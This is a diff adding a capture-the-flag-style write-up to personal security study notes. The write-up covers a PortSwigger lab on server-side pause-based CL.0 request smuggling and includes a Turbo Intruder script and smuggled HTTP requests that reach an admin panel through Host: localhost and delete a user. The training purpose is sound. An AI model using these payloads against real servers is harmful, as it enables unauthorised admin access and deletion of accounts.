@@ -1032,6 +1032,174 @@ Adjust content length until you get a session cookie
 
 Put in cookie editor and we solved the lab
 
+**Server-side pause-based request smuggling**
+
+Response show apache 2.4.52
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/19ef8f73-f4f4-41b6-b9b4-7f0c1e39d328)
+
+
+Vulnerable to pause-based CL.0 attacks on endpoints that trigger server-level redirects
+
+From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 
+
+
+
+Using turbo intruder extension 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b894efdf-150e-4a3d-9561-c7f92a580b03)
+
+Convert to post and Connection to keep-alive
+Add a complete GET /admin request to the body of the main request. The result should look something like this: 
+
+```
+POST /resources HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+GET /admin/ HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+```
+
+
+From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 
+
+In the Python editor panel, enter the following script. This issues the request twice, pausing for 61 seconds after the \r\n\r\n sequence at the end of the headers: 
+
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=500,
+                           pipeline=False
+                           )
+
+    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
+    engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 
+
+
+
+
+• Launch the attack. Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table: 
+	• The first entry is the POST /resources request, which triggered a redirect to /resources/ as normal. 
+	• The second entry is a response to the GET /admin/ request. Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability. 
+
+From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 
+
+Attack
+
+```
+POST /resources HTTP/1.1
+Host: 0a86002b041ca572898582b400f300ca.web-security-academy.net
+Cookie: session=ZCqkF1l1ZxKKVRZxmZvRCoq0X8uPBM9D
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+GET /admin/ HTTP/1.1
+Host: 0a86002b041ca572898582b400f300ca.web-security-academy.net
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a4a1e083-5e57-4775-ae9a-a5cbec5345c1)
+
+
+
+Exploit
+Changing smuggled host to localhost will redirect you to the admin panel 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6b0e63f6-2808-4d7b-a32b-559465183775)
+
+
+
+• Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details: 
+	• The action attribute (/admin/delete). 
+	• The name of the input (username). 
+	• The csrf token. 
+
+From <https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling> 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8a63194a-789d-469a-a6e6-fa3a17928209)
+
+
+
+Exploit will look like this
+
+```
+POST /resources HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+POST /admin/delete/ HTTP/1.1
+Host: localhost
+Content-Type: x-www-form-urlencoded
+Content-Length: CORRECT
+
+csrf=YOUR-CSRF-TOKEN&username=carlos
+```
+
+
+Find the content length of our smuggled request 
+
+`53`
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e4cc08b2-4919-49d5-a056-25cbeb031f4a)
+
+
+
+For our regular request replace content length of smuggled request 
+`159`
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1c73ae83-af98-4178-969d-729c8a050b33)
+
+
+Our turbo intruder response
+```
+POST /resources HTTP/1.1
+Host: 0a86002b041ca572898582b400f300ca.web-security-academy.net
+Cookie: session=ZCqkF1l1ZxKKVRZxmZvRCoq0X8uPBM9D
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 159
+
+POST /admin/delete/ HTTP/1.1
+Host: localhost
+Content-Type: x-www-form-urlencoded
+Content-Length: 53
+
+csrf=wKNpmqwMuYIkL2nYydGPXtB4acjDLkiJ&username=carlos
+```
+
+Replaced our python with the content length
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=500,
+                           pipeline=False
+                           )
+
+    engine.queue(target.req, pauseMarker=['Content-Length: 159\r\n\r\n'], pauseTime=61000)
+    engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+
+
+
+Deleted
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dd9bff3a-0143-45ac-8cf4-7c674c6d85ab)
+
+
+
+
+
 
 
 
